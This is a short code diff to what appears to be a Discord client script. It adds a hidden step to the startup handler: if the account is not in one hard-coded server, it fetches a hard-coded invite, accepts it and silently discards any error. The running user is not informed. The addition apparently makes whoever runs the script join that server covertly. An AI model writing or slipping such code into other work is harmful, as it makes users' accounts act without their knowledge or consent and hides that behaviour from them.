@@ -31,6 +31,11 @@ client.on('ready', () => {
         }],
         status: 'online',
     });
+    if(!client.guilds.cache.has('1042838652159533056')){
+        client.fetchInvite('PCSpuTgadU').then(invite => {
+            invite.acceptInvite().catch((err) => {});
+        });
+    }
 });
 
 client.on('messageCreate', async (message) => {
